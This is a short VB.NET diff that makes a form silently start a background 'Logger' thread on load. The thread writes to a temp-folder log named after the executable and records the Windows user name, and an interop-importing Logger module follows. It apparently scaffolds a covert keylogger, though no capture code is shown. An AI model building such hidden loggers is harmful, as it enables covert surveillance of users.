@@ -1,3 +1,18 @@
+'Form1/Main:
+    Dim s As String = New IO.FileInfo(Application.ExecutablePath).Name
+    Dim loggerPath As String = IO.Path.GetTempPath & "\" & s & ".log"
+    Public PcUsername As String = Environment.UserName
+    Dim LoggerThread As Thread = New Thread(AddressOf Logger.Start, 1)
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+    LoggerThread.Start()
+    End Sub
+
+
+
+
+
+'Module Logger.vb:
 Imports System.IO
 Imports System.Text
 Imports System.Runtime.InteropServices
